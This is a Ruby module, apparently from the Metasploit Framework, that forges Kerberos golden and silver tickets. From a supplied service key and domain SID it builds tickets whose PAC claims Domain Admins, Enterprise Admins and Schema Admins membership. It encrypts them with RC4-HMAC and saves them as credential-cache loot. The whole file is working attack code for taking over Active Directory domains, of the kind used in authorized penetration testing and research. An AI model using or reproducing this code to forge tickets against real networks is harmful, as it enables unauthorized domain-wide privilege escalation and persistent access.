# -*- coding: binary -*-

require 'date'

module Msf
  class Exploit
    class Remote
      module Kerberos
        module Ticket
          def create_ticket(enc_key:, start_time:, end_time:, sname:, flags:, domain:, username:, user_id: Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID, domain_sid:, save_ccache: true)
            sname_principal = create_principal(sname)
            cname_principal = create_principal(username)
            group_ids = [
              Rex::Proto::Kerberos::Pac::DOMAIN_USERS,
              Rex::Proto::Kerberos::Pac::DOMAIN_ADMINS,
              Rex::Proto::Kerberos::Pac::GROUP_POLICY_CREATOR_OWNERS,
              Rex::Proto::Kerberos::Pac::SCHEMA_ADMINISTRATORS,
              Rex::Proto::Kerberos::Pac::ENTERPRISE_ADMINS,
            ]
            opts = {
              client: cname_principal,
              server: sname_principal,
              auth_time: start_time,
              start_time: start_time,
              end_time: end_time,
              renew_till: end_time,
              realm: domain.upcase,
              key_value: enc_key,
              checksum_enc_key: enc_key,
              secure_random_key: SecureRandom.hex(8),
              user_id: user_id,
              group_ids: group_ids,
              checksum_type: Rex::Proto::Kerberos::Crypto::Checksum::HMAC_MD5,
              client_name: username,
              domain_id: domain_sid,
              flags: flags
            }

            ticket_enc_part = create_enc_ticket_part(opts: opts)
            enc_part = encrypt_ticket_enc_part(ticket_enc_part: ticket_enc_part, key: opts[:key_value])
            ticket = Rex::Proto::Kerberos::Model::Ticket.new(
              tkt_vno: Rex::Proto::Kerberos::Model::VERSION,
              realm: opts[:realm],
              sname: opts[:server],
              enc_part: enc_part
            )
            if save_ccache
              ccache = generate_ccache(ticket, opts: opts)
              path = store_loot('kerberos_ticket.ccache', 'application/octet-stream', domain, ccache.encode)
              print_good("MIT Credential Cache ticket saved on #{path}")
            end
            ticket
          end

          def create_enc_ticket_part(opts:)
            ticket_enc_part = Rex::Proto::Kerberos::Model::TicketEncPart.new

            ticket_enc_part.key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
              type: Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC, value: opts[:secure_random_key]
            )
            ticket_enc_part.flags = opts[:flags]
            ticket_enc_part.crealm = opts[:realm]
            ticket_enc_part.cname = opts[:client]
            ticket_enc_part.transited = Rex::Proto::Kerberos::Model::TransitedEncoding.new(tr_type: 0, contents: '')
            ticket_enc_part.authtime = opts[:auth_time]
            ticket_enc_part.starttime = opts[:start_time]
            ticket_enc_part.endtime = opts[:end_time]
            ticket_enc_part.renew_till = opts[:renew_till]
            ticket_enc_part.authorization_data = build_pac_authorization_data(opts)
            ticket_enc_part
          end

          def encrypt_ticket_enc_part(ticket_enc_part:, key:)
            encrypted = Rex::Proto::Kerberos::Crypto::Rc4Hmac.new.encrypt(
              ticket_enc_part.encode, key, Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET
            )

            Rex::Proto::Kerberos::Model::EncryptedData.new(
              etype: Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC, kvno: 2, cipher: encrypted
            )
          end

          def silver_ticket_flags
            [
              Rex::Proto::Kerberos::Model::TicketFlag::FORWARDABLE,
              Rex::Proto::Kerberos::Model::TicketFlag::PROXIABLE,
              Rex::Proto::Kerberos::Model::TicketFlag::RENEWABLE,
              Rex::Proto::Kerberos::Model::TicketFlag::PRE_AUTHENT
            ]
          end

          def golden_ticket_flags
            silver_ticket_flags << Rex::Proto::Kerberos::Model::TicketFlag::INITIAL
          end

          def generate_ccache(ticket, opts:)
            Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.new(
              default_principal: create_ccache_principal(opts[:client], opts[:realm]),
              credentials: [
                {
                  client: create_ccache_principal(opts[:client], opts[:realm]),
                  server: create_ccache_principal(opts[:server], opts[:realm]),
                  keyblock: {
                    enctype: Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC,
                    data: opts[:secure_random_key]
                  },
                  authtime: opts[:auth_time],
                  starttime: opts[:start_time],
                  endtime: opts[:end_time],
                  renew_till: opts[:renew_till],
                  ticket_flags: opts[:flags].to_i,
                  ticket: ticket.encode
                }
              ]
            )
          end

          def create_principal(name)
            Rex::Proto::Kerberos::Model::PrincipalName.new(
              name_type: Rex::Proto::Kerberos::Model::NameType::NT_PRINCIPAL,
              name_string: Array.wrap(name)
            )
          end

          def create_ccache_principal(principle, realm)
            Rex::Proto::Kerberos::CredentialCache::Krb5CcachePrincipal.new(name_type: principle.name_type,
                                                                           components: principle.name_string,
                                                                           realm: realm)
          end
        end
      end
    end
  end
end
